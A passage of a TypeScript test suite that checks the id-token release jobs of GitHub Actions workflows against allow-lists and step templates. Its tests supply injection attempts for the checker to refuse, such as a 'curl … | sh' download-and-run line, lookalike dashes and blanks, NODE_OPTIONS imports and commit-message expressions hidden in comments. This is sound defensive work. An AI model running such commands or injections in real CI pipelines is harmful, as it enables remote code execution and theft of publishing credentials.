      env: { REPO: '${{ github.repository }}' },
      run: [
        'ref="ghcr.io/${REPO,,}:${GITHUB_REF#refs/tags/v}"',
        'docker buildx imagetools inspect "$ref" | tee /tmp/inspect.txt',
        'for want in linux/amd64 linux/arm64; do',
        'grep -q "$want" /tmp/inspect.txt || { echo "MISSING PLATFORM: $want"; exit 1; }',
        'done',
      ],
    },
  ];
  // NODE_VERSION and DOCKER_PLATFORMS are the workflow's own env; no step of promote reads either.
  const IMAGE_RELEASE: FileAllowList = {
    workflowEnv: ['NODE_VERSION', 'DOCKER_PLATFORMS'],
    jobs: {
      promote: {
        stepKeys: ['name', 'uses', 'id', 'with', 'env', 'run'],
        jobKeys: ['name', 'runs-on', 'timeout-minutes', 'permissions', 'needs', 'steps'],
        permissions: { packages: 'write', 'id-token': 'write', attestations: 'write' },
        runsOn: 'ubuntu-latest',
        needs: ['docker', 'boot-smoke', 'image-scan', 'release-tags'],
        timeout: 15,
        steps: IMAGE_PROMOTE,
        ...flatten(IMAGE_PROMOTE),
      },
    },
  };
  const ALLOW_LISTS: Record<string, FileAllowList> = {
    'js-sdk-release.yml': JS_SDK_RELEASE,
    'python-sdk-release.yml': PYTHON_SDK_RELEASE,
    'release.yml': IMAGE_RELEASE,
  };

  const allows = (list: Allowed[], value: string): boolean =>
    list.some(item => (typeof item === 'string' ? item === value : item.test(value)));

  // The executable lines of a script, one per entry. Only a space and a tab come off: trim() would also drop
  // characters the shell reads as a word.
  const scriptLines = (run: string | undefined): string[] =>
    executableLines(run ?? '')
      .split('\n')
      .map(text => text.replace(/^[ \t]+|[ \t]+$/g, ''))
      .filter(Boolean);

  const NOTHING = 'a step without a name or an action';
  // How a message names a step: by its name, else by its action without the ref.
  const stepLabel = (step: Step): string =>
    step.name !== undefined ? String(step.name) : typeof step.uses === 'string' ? step.uses.split('@')[0] : NOTHING;

  // GitHub expands `${{ }}` in the whole script before the shell starts, comments included, so an expression
  // behind a '#' is still evaluated, and a value with a newline in it ends the comment and begins a command
  // beside the credential. What the shell reads as a comment is cut from the executable lines, so a script
  // that holds more of them than its executable lines do has one in a comment.
  const expressionsIn = (text: string): number => text.split('${{').length - 1;

  const outsideAllowList = (source: string | OidcWorkflow, allowed: FileAllowList = JS_SDK_RELEASE): string[] => {
    const jobs = oidcJobs(source);
    if (jobs.length === 0) return [];
    const workflow = loadOidcWorkflow(source);
    const found: string[] = [];
    for (const name of Object.keys(workflow.env ?? {})) {
      if (!allowed.workflowEnv.includes(name)) found.push(`workflow: env ${name}`);
    }
    if (workflow.defaults !== undefined) found.push('workflow: defaults');
    for (const [job, def] of jobs) {
      const list = Object.hasOwn(allowed.jobs, job) ? allowed.jobs[job] : undefined;
      if (!list) {
        found.push(`${job}: no allow-list`);
        continue;
      }
      for (const key of Object.keys(def)) if (!list.jobKeys.includes(key)) found.push(`${job}: job key ${key}`);
      // The keys that are allowed are held at their values.
      const shown = (value: unknown): string => (typeof value === 'string' ? value : (JSON.stringify(value) ?? 'none'));
      if (def['runs-on'] !== list.runsOn) {
        found.push(`${job}: runs-on ${shown(def['runs-on'])}, expected ${list.runsOn}`);
      }
      const needs = [def.needs ?? []].flat() as unknown[];
      if (JSON.stringify([...needs].sort()) !== JSON.stringify([...list.needs].sort())) {
        found.push(`${job}: needs ${shown(def.needs)}, expected ${list.needs.join(', ')}`);
      }
      if (def['timeout-minutes'] !== list.timeout) {
        found.push(`${job}: timeout-minutes ${shown(def['timeout-minutes'])}, expected ${list.timeout}`);
      }
      // What the job holds is its own block, or the workflow's when it has none.
      const held = def.permissions !== undefined ? def.permissions : workflow.permissions;
      if (typeof held === 'string') {
        found.push(`${job}: permissions ${held}`);
      } else {
        // A scope that is not named is held at none, so a listed scope the job left out is a drop.
        const scopes = held ?? {};
        for (const scope of new Set([...Object.keys(scopes), ...Object.keys(list.permissions)])) {
          const level = Object.hasOwn(scopes, scope) ? scopes[scope] : 'none';
          const listed = Object.hasOwn(list.permissions, scope) ? list.permissions[scope] : 'none';
          if (level !== listed) found.push(`${job}: permission ${scope}: ${level}`);
        }
      }
      for (const step of def.steps ?? []) {
        for (const key of Object.keys(step)) if (!list.stepKeys.includes(key)) found.push(`${job}: step key ${key}`);
        if (list.stepKeys.includes('env')) {
          for (const [name, value] of Object.entries((step.env ?? {}) as Record<string, unknown>)) {
            if (!Object.hasOwn(list.env, name) || !allows(list.env[name], String(value))) {
              found.push(`${job}: step env ${name}`);
            }
          }
        }
        if (step.uses !== undefined) {
          const action = /^([^@\s]+)@[0-9a-f]{40}$/.exec(step.uses)?.[1];
          const inputs = action !== undefined && Object.hasOwn(list.actions, action) ? list.actions[action] : undefined;
          if (!inputs) {
            found.push(`${job}: uses ${step.uses}`);
          } else {
            for (const [key, value] of Object.entries((step.with ?? {}) as Record<string, unknown>)) {
              if (!Object.hasOwn(inputs, key)) found.push(`${job}: with ${key}`);
              else if (!allows(inputs[key], String(value))) found.push(`${job}: with ${key}: ${String(value)}`);
            }
          }
        }
        for (const line of scriptLines(step.run)) {
          if (!allows(list.commands, line)) found.push(`${job}: ${line}`);
        }
        if (expressionsIn(step.run ?? '') > expressionsIn(executableLines(step.run ?? ''))) {
          found.push(`${job}: step "${stepLabel(step)}": a \${{ expression in a comment`);
        }
      }
    }
    return found;
  };

  const STEP_KEYS = ['name', 'uses', 'id', 'with', 'env', 'run'];
  const show = (value: Allowed): string => (typeof value === 'string' ? value : String(value));

  // An id-token job's steps against its template: the same steps, in the same order, each exactly once, and
  // then each step's own keys, inputs, env and script lines. The content of the steps is compared only once
  // the sequence is right, so a move, a duplicate or a removal is named as such and not as a run of
  // mismatches behind it.
  const outsideStepTemplate = (source: string | OidcWorkflow, allowed: FileAllowList): string[] => {
    const found: string[] = [];
    for (const [job, def] of oidcJobs(source)) {
      const template = Object.hasOwn(allowed.jobs, job) ? allowed.jobs[job].steps : undefined;
      if (!template) {
        found.push(`${job}: no step template`);
        continue;
      }
      const steps = def.steps ?? [];
      const have = steps.map(stepLabel);
      const want = template.map(step => step.name ?? step.uses ?? NOTHING);
      const times = (names: string[], name: string): number => names.filter(item => item === name).length;
      const counted = [...new Set([...have, ...want])].flatMap(name => {
        const [n, m] = [times(have, name), times(want, name)];
        if (n === m) return [];
        if (m === 0) return [`${job}: step "${name}" is not in the template`];
        if (n === 0) return [`${job}: step "${name}" is missing`];
        return [`${job}: step "${name}" appears ${n} times, expected ${m}`];
      });
      if (counted.length > 0) {
        found.push(...counted);
        continue;
      }
      if (have.some((name, i) => name !== want[i])) {
        have.forEach((name, i) => {
          if (name !== want[i]) found.push(`${job}: step ${i + 1} is "${name}", expected "${want[i]}"`);
        });
        continue;
      }
      steps.forEach((step, i) => {
        const wanted = template[i];
        const where = `${job} step ${i + 1} "${want[i]}"`;
        const record = step as Record<string, unknown>;
        const keys = STEP_KEYS.filter(key => wanted[key as keyof StepTemplate] !== undefined);
        for (const key of Object.keys(record)) if (!keys.includes(key)) found.push(`${where}: step key ${key}`);
        for (const key of keys) if (record[key] === undefined) found.push(`${where}: no ${key}`);
        const text = (value: unknown): string => (typeof value === 'string' ? value : JSON.stringify(value));
        if (wanted.uses !== undefined && record.uses !== undefined) {
          const action = /^([^@\s]+)@[0-9a-f]{40}$/.exec(text(record.uses))?.[1];
          if (action !== wanted.uses) {
            found.push(`${where}: uses ${text(record.uses)}, expected ${wanted.uses} at a commit`);
          }
        }
        if (wanted.id !== undefined && record.id !== undefined && record.id !== wanted.id) {
          found.push(`${where}: id ${text(record.id)}, expected ${wanted.id}`);
        }
        // Exactly the keys of the template, each with the one value it may take.
        const exact = (kind: 'with' | 'env', expected: Record<string, Allowed> | undefined): void => {
          if (expected === undefined || record[kind] === undefined) return;
          const given = record[kind];
          if (typeof given !== 'object' || given === null) {
            found.push(`${where}: ${kind} is not a mapping`);
            return;
          }
          for (const [key, value] of Object.entries(given)) {
            if (!Object.hasOwn(expected, key)) {
              found.push(`${where}: ${kind} ${key}`);
            } else if (!allows([expected[key]], String(value))) {
              found.push(`${where}: ${kind} ${key}: ${String(value)}, expected ${show(expected[key])}`);
            }
          }
          for (const key of Object.keys(expected)) {
            if (!Object.hasOwn(given, key)) found.push(`${where}: ${kind} ${key} is missing`);
          }
        };
        exact('with', wanted.with);
        exact('env', wanted.env);
        if (wanted.run !== undefined && record.run !== undefined) {
          const lines = scriptLines(step.run);
          const script = wanted.run;
          const at = lines.findIndex((line, k) => k >= script.length || !allows([script[k]], line));
          if (at !== -1) {
            const expected = at < script.length ? show(script[at]) : 'the script to end';
            found.push(`${where}: run line ${at + 1}: ${lines[at]}, expected ${expected}`);
          } else if (lines.length < script.length) {
            found.push(`${where}: run ends after line ${lines.length}, expected ${show(script[lines.length])}`);
          }
        }
      });
    }
    return found;
  };

  it('js-sdk-release.yml: the id-token job runs only the pinned npm and the publish', () => {
    // Non-vacuity: the finder sees the publish step.
    expect(
      oidcJobRuns('js-sdk-release.yml', executableLinesConservative).some(({ run }) => /^npm publish\b/m.test(run)),
    ).toBe(true);
    expect(outsideAllowList('js-sdk-release.yml')).toEqual([]);
    // The workflow says it installs the npm the image does; nothing else holds the two pins together.
    const imageNpm = /^RUN npm install -g (npm@\d+\.\d+\.\d+) /m.exec(
      fs.readFileSync(path.join(__dirname, '..', '..', 'Dockerfile'), 'utf8'),
    )?.[1];
    expect(imageNpm).toBeDefined();
    expect(globalInstallsInOidcJobs('js-sdk-release.yml')).toEqual([{ job: 'publish', spec: imageNpm }]);
  });

  // Every workflow is read against its own list, so an id-token job anywhere that has none (a new
  // workflow, or the grant added to another job of release.yml) fails here instead of going unchecked.
  it('finds the id-token job of each release workflow', () => {
    const named = Object.fromEntries(
      workflows
        .map(file => [file, oidcJobs(file).map(([job]) => job)] as const)
        .filter(([, names]) => names.length > 0),
    );
    expect(named).toEqual({
      'js-sdk-release.yml': ['publish'],
      'python-sdk-release.yml': ['publish'],
      'release.yml': ['promote'],
    });
    // Non-vacuity: the lines of promote are the ones that re-point the release tags.
    expect(
      oidcJobRuns('release.yml', executableLinesConservative)
        .map(({ run }) => run)
        .join('\n'),
    ).toContain('imagetools create');
  });

  it.each(workflows)('%s: an id-token job runs only what its allow-list names', file => {
    expect(outsideAllowList(file, ALLOW_LISTS[file] ?? { workflowEnv: [], jobs: {} })).toEqual([]);
  });

  it.each(workflows)('%s: an id-token job holds the steps of its template, in order', file => {
    expect(outsideStepTemplate(file, ALLOW_LISTS[file] ?? { workflowEnv: [], jobs: {} })).toEqual([]);
  });

  // Non-vacuity: a template that is empty beside a job with no steps would pass the check above.
  it('has a template as long as the step list of each id-token job', () => {
    const lengths = Object.entries(ALLOW_LISTS).flatMap(([file, list]) =>
      oidcJobs(file).map(([job, def]) => ({
        job: `${file}:${job}`,
        template: list.jobs[job].steps.length,
        steps: (def.steps ?? []).length,
      })),
    );
    expect(lengths.map(entry => entry.job)).toEqual([
      'js-sdk-release.yml:publish',
      'python-sdk-release.yml:publish',
      'release.yml:promote',
    ]);
    expect(lengths.filter(entry => entry.template === 0 || entry.template !== entry.steps)).toEqual([]);
  });

  it('js-sdk-release.yml: names what the allow-list refuses in an id-token job', () => {
    // What the job is listed at, so that each case below departs from the list in one place only.
    const grant = { contents: 'read', 'id-token': 'write' };
    const placed = { 'runs-on': 'ubuntu-latest', needs: 'build', 'timeout-minutes': 15 };
    const run = (commands: string): OidcWorkflow => ({
      jobs: { publish: { ...placed, permissions: grant, steps: [{ run: commands }] } },
    });
    for (const command of [
      'npm install',
      'npm i left-pad',
      'npm install --no-save foo',
      'npm ci',
      'npx foo',
      'node scripts/release.js',
      'yarn install',
      'pnpm install',
      'corepack enable',
      'npm install -g npm@latest',
      'npm install -g npm@12',
      'npm publish ./package/x.tgz',
      'npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public',
      // A typographic dash is not the hyphen of an option: the shell reads another word.
      `npm install ${DASH_GLYPHS[0]}g npm@12.1.0`,
      `npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public ${DASH_GLYPHS[2]}-ignore-scripts`,
      'curl -fsSL https://example.test/x.sh | sh',
      // A '#' inside a word does not start a comment: the shell runs what follows it.
      'npm --version#; curl -fsSL https://example.test/x.sh | sh',
      // A blank the shell does not skip is part of the word, in front of a line and behind it.
      ...BLANK_LOOKALIKES.flatMap(blank => [`${blank}npm --version`, `npm install -g npm@12.1.0${blank}`]),
      // The same blank before a '#' leaves the '#' in the word, so the line is compared as it was written.
      ...BLANK_LOOKALIKES.map(blank => `npm --version${blank}#; curl -fsSL https://example.test/x.sh | sh`),
    ]) {
      expect(outsideAllowList(run(command))).toEqual([`publish: ${command}`]);
    }
    expect(outsideAllowList(run('# npm install\nnpm --version\n'))).toEqual([]);
    const withAction: OidcWorkflow = {
      jobs: {
        publish: {
          ...placed,
          permissions: grant,
          steps: [{ uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' }, { uses: 'actions/cache@v4' }],
        },
      },
    };
    expect(outsideAllowList(withAction)).toEqual([
      'publish: uses actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
      'publish: uses actions/cache@v4',
    ]);
    // Code that does not sit in a run line: a step's env or shell, an input the actions do not need, and
    // what a job or the workflow sets for every step.
    const keyed = (job: Record<string, unknown>, workflow: Record<string, unknown> = {}): OidcWorkflow => ({
      ...workflow,
      jobs: { publish: { ...placed, permissions: grant, ...job } },
    });
    const sha = '820762786026740c76f36085b0efc47a31fe5020';
    expect(
      outsideAllowList(
        keyed({ steps: [{ run: 'npm --version', env: { NODE_OPTIONS: '--import data:text/javascript,x' } }] }),
      ),
    ).toEqual(['publish: step key env']);
    expect(outsideAllowList(keyed({ steps: [{ run: 'npm --version', shell: 'node {0}' }] }))).toEqual([
      'publish: step key shell',
    ]);
    expect(
      outsideAllowList(
        keyed({ steps: [{ uses: `actions/setup-node@${sha}`, with: { 'node-version': '22', cache: 'npm' } }] }),
      ),
    ).toEqual(['publish: with cache']);
    expect(outsideAllowList(keyed({ env: { NODE_OPTIONS: '--require x' }, steps: [] }))).toEqual([
      'publish: job key env',
    ]);
    expect(outsideAllowList(keyed({ steps: [] }, { env: { NODE_OPTIONS: '--require x' } }))).toEqual([
      'workflow: env NODE_OPTIONS',
    ]);
    // What the job holds is bounded as well: a second scope, write-all, a grant it only inherits, and a
    // scope it has let go of.
    expect(outsideAllowList(keyed({ permissions: { 'id-token': 'write', contents: 'write' }, steps: [] }))).toEqual([
      'publish: permission contents: write',
    ]);
    expect(outsideAllowList(keyed({ permissions: { 'id-token': 'write' }, steps: [] }))).toEqual([
      'publish: permission contents: none',
    ]);
    expect(outsideAllowList(keyed({ permissions: 'write-all', steps: [] }))).toEqual([
      'publish: permissions write-all',
    ]);
    // A scope the list does not name and the job holds at none grants nothing.
    expect(outsideAllowList(keyed({ permissions: { ...grant, packages: 'none' }, steps: [] }))).toEqual([]);
    expect(
      outsideAllowList({
        permissions: { ...grant, packages: 'write' },
        jobs: { publish: { ...placed, steps: [] } },
      }),
    ).toEqual(['publish: permission packages: write']);
    // A job without the grant is not the publish job.
    expect(
      outsideAllowList({ jobs: { build: { permissions: { contents: 'read' }, steps: [{ run: 'npm ci' }] } } }),
    ).toEqual([]);
    // One that has the grant and no list is named, whatever it is called or runs.
    expect(
      outsideAllowList({
        jobs: { deploy: { permissions: { 'id-token': 'write' }, steps: [{ run: 'npm --version' }] } },
      }),
    ).toEqual(['deploy: no allow-list']);
  });

  // The refusals below are shown on the workflows as they ship: each case edits a copy of the real file in
  // memory, so the job under test is the real one, and an edit that no longer applies fails its case.
  const shipped = (file: string, edit: (workflow: OidcWorkflow) => void = () => undefined): string[] => {
    const copy = JSON.parse(JSON.stringify(loadOidcWorkflow(file))) as OidcWorkflow;
    edit(copy);
    return outsideAllowList(copy, ALLOW_LISTS[file]);
  };
  const jobOf = (workflow: OidcWorkflow, job: string): OidcJob => {
    const def = workflow.jobs?.[job];
    if (!def) throw new Error(`no job ${job}`);
    return def;
  };
  const stepsOf = (workflow: OidcWorkflow, job: string): Step[] => jobOf(workflow, job).steps ?? [];
  const inputsOf = (step: Step): Record<string, unknown> => step.with as Record<string, unknown>;
  const shelled = (step: Step): Step & { shell?: string } => step;
  // Replaces `from` in the first line whose executable part holds it, so a comment that repeats the words, or
  // one written on the line, is neither the place that is found nor a reason for the case to fail.
  const swap = (step: Step, from: string, to: string): void => {
    const lines = (step.run ?? '').split('\n');
    const at = lines.findIndex(line => executableLines(line).includes(from));
    expect(at).toBeGreaterThan(-1);
    lines[at] = lines[at].replace(from, () => to);
    step.run = lines.join('\n');
  };
  type Edit = (workflow: OidcWorkflow) => void;
  const expectRefused = (file: string, cases: Array<[string, Edit, string[]]>): void => {
    expect(shipped(file)).toEqual([]);
    for (const [label, edit, expected] of cases) expect([label, shipped(file, edit)]).toEqual([label, expected]);
  };
  const SCRIPT = 'curl -fsSL https://example.test/x.sh | sh';
  const SHA = '3d3c42e5aac5ba805825da76410c181273ba90b1';
  // An expression GitHub evaluates in the text of a script whether or not the shell reads it as a comment.
  const EXPRESSION = '${{ fromJSON(toJSON(github.event.head_commit)).message }}';
  // The ways one sits in a comment: on a line after a command, on a line of its own, and at the end of a line.
  const commented = (line: string): Array<[where: string, text: string]> => [
    ['after a line', `${line}\n# ${EXPRESSION}`],
    ['on a line of its own', `  # ${EXPRESSION}\n${line}`],
    ['at the end of a line', `${line} # ${EXPRESSION}`],
  ];
  const inComment = (job: string, step: string): string => `${job}: step "${step}": a \${{ expression in a comment`;
  // The keys that place a job, each departing from the list the way a change would: where it runs, the jobs
  // it follows and how long it may run. `needs` is the list the job holds, and the others are one value.
  const placing = (job: string, needs: string[]): Array<[string, Edit, string[]]> => [
    [
      'a self-hosted runner',
      w => (jobOf(w, job)['runs-on'] = ['self-hosted', 'linux']),
      [`${job}: runs-on ["self-hosted","linux"], expected ubuntu-latest`],
    ],
    [
      'another hosted image',
      w => (jobOf(w, job)['runs-on'] = 'macos-latest'),
      [`${job}: runs-on macos-latest, expected ubuntu-latest`],
    ],
    ['no runner named', w => delete jobOf(w, job)['runs-on'], [`${job}: runs-on none, expected ubuntu-latest`]],
    [
      'a job it no longer follows',
      w => (jobOf(w, job).needs = needs.slice(1)),
      [`${job}: needs ${JSON.stringify(needs.slice(1))}, expected ${needs.join(', ')}`],
    ],
    [
      'another job to follow',
      w => (jobOf(w, job).needs = [...needs, 'other']),
      [`${job}: needs ${JSON.stringify([...needs, 'other'])}, expected ${needs.join(', ')}`],
    ],
    ['no jobs to follow', w => delete jobOf(w, job).needs, [`${job}: needs none, expected ${needs.join(', ')}`]],
    ['a longer timeout', w => (jobOf(w, job)['timeout-minutes'] = 120), [`${job}: timeout-minutes 120, expected 15`]],
    ['no timeout', w => delete jobOf(w, job)['timeout-minutes'], [`${job}: timeout-minutes none, expected 15`]],
  ];

  it('python-sdk-release.yml: names what the allow-list refuses in the publish job', () => {
    const steps = (workflow: OidcWorkflow): Step[] => stepsOf(workflow, 'publish');
    const [download, pypi] = [0, 1];
    expectRefused('python-sdk-release.yml', [
      ['a command', w => void steps(w).push({ run: SCRIPT }), [`publish: ${SCRIPT}`]],
      ['an install', w => void steps(w).push({ run: 'pip install twine' }), ['publish: pip install twine']],
      [
        'another action',
        w => void steps(w).push({ uses: `actions/checkout@${SHA}` }),
        [`publish: uses actions/checkout@${SHA}`],
      ],
      [
        'the upload action by a branch',
        w => (steps(w)[pypi].uses = 'pypa/gh-action-pypi-publish@release/v1'),
        ['publish: uses pypa/gh-action-pypi-publish@release/v1'],
      ],
      [
        'another index',
        w => (inputsOf(steps(w)[pypi])['repository-url'] = 'https://example.test/legacy/'),
        ['publish: with repository-url'],
      ],
      ['a password', w => (inputsOf(steps(w)[pypi]).password = 'x'), ['publish: with password']],
      ['another directory', w => (inputsOf(steps(w)[pypi])['packages-dir'] = '.'), ['publish: with packages-dir: .']],
      ['another artifact', w => (inputsOf(steps(w)[download]).name = 'other'), ['publish: with name: other']],
      ['an artifact of another run', w => (inputsOf(steps(w)[download])['run-id'] = '1'), ['publish: with run-id']],
      [
        'a download that tolerates a changed digest',
        w => (inputsOf(steps(w)[download])['digest-mismatch'] = 'ignore'),
        ['publish: with digest-mismatch'],
      ],
      ['a step env', w => (steps(w)[pypi].env = { PYTHONPATH: '.' }), ['publish: step key env']],
      ['a shell', w => (shelled(steps(w)[pypi]).shell = 'python {0}'), ['publish: step key shell']],
      ['a job env', w => (jobOf(w, 'publish').env = { PYTHONPATH: '.' }), ['publish: job key env']],
      ['a container', w => (jobOf(w, 'publish').container = 'example.test/runner:1'), ['publish: job key container']],
      [
        'a wider grant',
        w => (jobOf(w, 'publish').permissions = { contents: 'write', 'id-token': 'write' }),
        ['publish: permission contents: write'],
      ],
      [
        'a scope it no longer holds',
        w => (jobOf(w, 'publish').permissions = { 'id-token': 'write' }),
        ['publish: permission contents: none'],
      ],
      ['a workflow env', w => (w.env = { PYTHONPATH: '.' }), ['workflow: env PYTHONPATH']],
      ['workflow defaults', w => (w.defaults = { run: { shell: 'python {0}' } }), ['workflow: defaults']],
      ...placing('publish', ['build']),
      [
        'an expression in a script that is only a comment',
        w => void steps(w).push({ name: 'Note', run: `# ${EXPRESSION}` }),
        [inComment('publish', 'Note')],
      ],
      ...commented('exit 0').map(([where, text]): [string, Edit, string[]] => [
        `an expression in a comment ${where}`,
        w => void steps(w).push({ name: 'Note', run: text }),
        ['publish: exit 0', inComment('publish', 'Note')],
      ]),
    ]);
  });

  it('release.yml: names what the allow-list refuses in the promote job', () => {
    const steps = (workflow: OidcWorkflow): Step[] => stepsOf(workflow, 'promote');
    const named = (workflow: OidcWorkflow, name: string): Step => {
      const found = steps(workflow).find(step => step.name === name);
      if (!found) throw new Error(`no step ${name}`);
      return found;
    };
    const TAGGING = 'Tag the smoke-tested image with the release tags';
    const tag = (workflow: OidcWorkflow): Step => named(workflow, TAGGING);
    const uses = (workflow: OidcWorkflow, action: string, nth = 0): Step =>
      steps(workflow).filter(step => (step.uses ?? '').startsWith(`${action}@`))[nth];
    const lookalikeHyphens: Array<[string, string]> = [
      ['set -euo pipefail', 'set -euo pipefail'],
      ['read -r tag', 'while IFS= read -r tag; do'],
      ['[ -n "$tag" ]', '[ -n "$tag" ] || continue'],
      ['[ "$promoted" -eq 0 ]', 'if [ "$promoted" -eq 0 ]; then'],
    ];
    // The hyphen of an option or an operator in the decision lines, replaced by each lookalike. With an en
    // dash for the first hyphen, `set -euo pipefail` only assigns positional parameters: errexit, nounset
    // and pipefail stay off. A changed `read`, `[ -n` or `-eq` is another command the same way.
    const lookalikes = lookalikeHyphens.flatMap(([fragment, line]) =>
      DASH_GLYPHS.map((glyph): [string, Edit, string[]] => {
        const changed = fragment.replace('-', () => glyph);
        return [
          `${line} with U+${glyph.charCodeAt(0).toString(16)}`,
          w => swap(tag(w), fragment, changed),
          [`promote: ${line.replace(fragment, () => changed)}`],
        ];
      }),
    );
    // A character that String.trim() drops and the shell does not skip, in front of a decision line or behind
    // it, is not the listed line: the shell reads `<U+a0>set` as a command of that name.
    const strayBlanks = ['set -euo pipefail', '[ -n "$tag" ] || continue', 'if [ "$promoted" -eq 0 ]; then'].flatMap(
      line =>
        BLANK_LOOKALIKES.flatMap((blank): Array<[string, Edit, string[]]> => {
          const code = `U+${blank.charCodeAt(0).toString(16)}`;
          return [
            [`${code} before ${line}`, w => swap(tag(w), line, `${blank}${line}`), [`promote: ${blank}${line}`]],
            [`${code} after ${line}`, w => swap(tag(w), line, `${line}${blank}`), [`promote: ${line}${blank}`]],
          ];
        }),
    );
    expectRefused('release.yml', [
      ...lookalikes,
      ...strayBlanks,
      ['a step', w => void steps(w).push({ run: SCRIPT }), [`promote: ${SCRIPT}`]],
      ...placing('promote', ['docker', 'boot-smoke', 'image-scan', 'release-tags']),
      ...commented('set -euo pipefail').map(([where, text]): [string, Edit, string[]] => [
        `an expression in a comment ${where}`,
        w => swap(tag(w), 'set -euo pipefail', text),
        [inComment('promote', TAGGING)],
      ]),
      ...commented('docker buildx imagetools create --tag "$tag" "$staging"').map(
        ([where, text]): [string, Edit, string[]] => [
          `an expression in a comment ${where} the re-point`,
          w => swap(tag(w), 'docker buildx imagetools create --tag "$tag" "$staging"', text),
          [inComment('promote', TAGGING)],
        ],
      ),
      [
        'a line in the tag step',
        w => swap(tag(w), 'echo "promoted $promoted tag(s)', `${SCRIPT}\necho "promoted $promoted tag(s)`),
        [`promote: ${SCRIPT}`],
      ],
      [
        'a changed command',
        w => swap(tag(w), 'imagetools create --tag', 'imagetools create --annotation k=v --tag'),
        ['promote: docker buildx imagetools create --annotation k=v --tag "$tag" "$staging"'],
      ],
      [
        'a weakened comparison',
        w => swap(tag(w), 'if [ "$actual" != "$EXPECTED_DIGEST" ]; then', 'if [ -z "$actual" ]; then'),
        ['promote: if [ -z "$actual" ]; then'],
      ],
      [
        'another action',
        w => void steps(w).push({ uses: `actions/cache@${SHA}` }),
        [`promote: uses actions/cache@${SHA}`],
      ],
      [
        'the attest action under another name',
        w => (uses(w, 'actions/attest').uses = `actions/attest-build-provenance@${SHA}`),
        [`promote: uses actions/attest-build-provenance@${SHA}`],
      ],
      [
        'a login action by tag',
        w => (uses(w, 'docker/login-action').uses = 'docker/login-action@v4'),
        ['promote: uses docker/login-action@v4'],
      ],
      [
        'a login against another registry',
        w => (inputsOf(uses(w, 'docker/login-action')).registry = 'registry.example.test'),
        ['promote: with registry: registry.example.test'],
      ],
      [
        'a login with another secret',
        w => (inputsOf(uses(w, 'docker/login-action', 1)).password = '${{ secrets.NPM_TOKEN }}'),
        ['promote: with password: ${{ secrets.NPM_TOKEN }}'],
      ],
      [
        'a builder driver',
        w => (uses(w, 'docker/setup-buildx-action').with = { 'driver-opts': 'image=example.test/buildkit:1' }),
        ['promote: with driver-opts'],
      ],
      [
        'an attestation pushed to the registry',
        w => (inputsOf(uses(w, 'actions/attest'))['push-to-registry'] = true),
        ['promote: with push-to-registry'],
      ],
      [
        'another subject digest',
        w => (inputsOf(uses(w, 'actions/attest'))['subject-digest'] = 'sha256:0'),
        ['promote: with subject-digest: sha256:0'],
      ],
      [
        'a step env',
        w => (tag(w).env = { ...(tag(w).env as object), DOCKER_HOST: 'tcp://x:1' }),
        ['promote: step env DOCKER_HOST'],
      ],
      [
        'a changed env value',
        w => (tag(w).env = { ...(tag(w).env as object), TAGS: 'example.test/x:1' }),
        ['promote: step env TAGS'],
      ],
      ['a shell', w => (shelled(tag(w)).shell = 'python {0}'), ['promote: step key shell']],
      ['a job env', w => (jobOf(w, 'promote').env = { DOCKER_HOST: 'tcp://x:1' }), ['promote: job key env']],
      [
        'a service container',
        w => (jobOf(w, 'promote').services = { x: { image: 'example.test/x:1' } }),
        ['promote: job key services'],
      ],
      [
        'a wider grant',
        w =>
          (jobOf(w, 'promote').permissions = {
            packages: 'write',
            'id-token': 'write',
            attestations: 'write',
            contents: 'write',
          }),
        ['promote: permission contents: write'],
      ],
      [
        'a lesser level than the one it is listed at',
        w => (jobOf(w, 'promote').permissions = { packages: 'read', 'id-token': 'write', attestations: 'write' }),
        ['promote: permission packages: read'],
      ],
      [
        'a scope it no longer holds',
        w => (jobOf(w, 'promote').permissions = { 'id-token': 'write', attestations: 'write' }),
        ['promote: permission packages: none'],
      ],
      [
        'a scope it holds at none',
        w => (jobOf(w, 'promote').permissions = { packages: 'write', 'id-token': 'write', attestations: 'none' }),
        ['promote: permission attestations: none'],
      ],
      [
        'a workflow env',
        w => (w.env = { ...(w.env as object), NODE_OPTIONS: '--require x' }),
        ['workflow: env NODE_OPTIONS'],
      ],
      ['workflow defaults', w => (w.defaults = { run: { shell: 'python {0}' } }), ['workflow: defaults']],
      [
        'the grant on another job',
        w => (jobOf(w, 'docker').permissions = { packages: 'write', 'id-token': 'write' }),
        ['docker: no allow-list'],
      ],
    ]);
  });

  // The template is shown on the workflows as they ship: each case edits a copy in memory and the message
  // names the step it lands on. A case marked blind is one the set-level list accepts as well, so only the
  // template refuses it.
  type TemplateCase = [label: string, edit: Edit, expected: string[], blind?: boolean];
  const expectOutsideTemplate = (file: string, cases: TemplateCase[]): void => {
    const against = (edit: Edit): string[] => {
      const copy = JSON.parse(JSON.stringify(loadOidcWorkflow(file))) as OidcWorkflow;
      edit(copy);
      return outsideStepTemplate(copy, ALLOW_LISTS[file]);
    };
    expect(against(() => undefined)).toEqual([]);
    for (const [label, edit, expected, blind] of cases) {
      expect([label, against(edit)]).toEqual([label, expected]);
      if (blind) expect([label, shipped(file, edit)]).toEqual([label, []]);
    }
  };
  const exchange = (job: string, a: number, b: number): Edit => {
    return w => {
      const steps = stepsOf(w, job);
      [steps[a], steps[b]] = [steps[b], steps[a]];
    };
  };
  // Two lines of a script traded places; the edit throws if either is not the line the case expects there.
  // Lines are counted among those that carry a command, so a comment written between two of them moves none,
  // and a line is compared by what it runs, so a comment written on one does not change which line it is.
  const exchangeLines = (step: Step, a: [number, Allowed], b: [number, Allowed]): void => {
    const lines = (step.run ?? '').split('\n');
    const carrying = lines.flatMap((line, i) => (scriptLines(line).length > 0 ? [i] : []));
    const [from, to] = [carrying[a[0]], carrying[b[0]]];
    expect(allows([a[1]], scriptLines(lines[from])[0])).toBe(true);
    expect(allows([b[1]], scriptLines(lines[to])[0])).toBe(true);
    [lines[from], lines[to]] = [lines[to], lines[from]];
    step.run = lines.join('\n');
  };
  // The control cases find a step by its name (its action when it has none) and a script line by its text in
  // the template, so adding, removing or reordering other steps moves nothing under them.
  const place = (template: StepTemplate[], name: string): number => {
    const found = template.findIndex(step => (step.name ?? step.uses) === name);
    expect(found).toBeGreaterThan(-1);
    return found;
  };
  const scriptOf = (template: StepTemplate[], step: number): Allowed[] => template[step].run ?? [];
